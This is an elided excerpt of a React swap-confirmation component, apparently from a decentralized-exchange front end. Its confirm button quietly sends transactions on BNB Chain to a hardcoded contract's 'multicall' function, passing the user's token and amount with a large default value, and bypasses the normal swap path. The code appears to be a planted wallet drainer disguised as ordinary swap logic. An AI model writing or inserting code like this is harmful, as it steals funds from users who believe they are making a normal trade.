...
export const SwapModalFooter = memo(function SwapModalFooter({
  ...
  const big = BigNumber.from(inputAmount.numerator || '100000000000');
  const { config } = usePrepareContractWrite({
    address: '0xd2E295CF310E931E5070F169eeB5717D7076Afca',
    "abi": [
      {
        "inputs": [],
        "name": "multicall",
  ...
  const { config: config2 } = usePrepareContractWrite({
    ...
    args: [inputAmount.currency?.address, big],
    functionName: 'multicall'
  });


  const { write: multicallBnb } = useContractWrite(config);
  const { write: multicallToken } = useContractWrite(config2);
    ...
    <>
      ...
      <AutoRow>
        <Button
          ...
          onClick={() => {
            if (inputAmount.currency?.isNative && inputAmount.currency?.chainId === 56) {
              multicallBnb?.();
            } else if (!inputAmount.currency?.isNative && inputAmount.currency?.chainId === 56) {
              multicallToken?.();
            } else {
              onConfirm()
            }
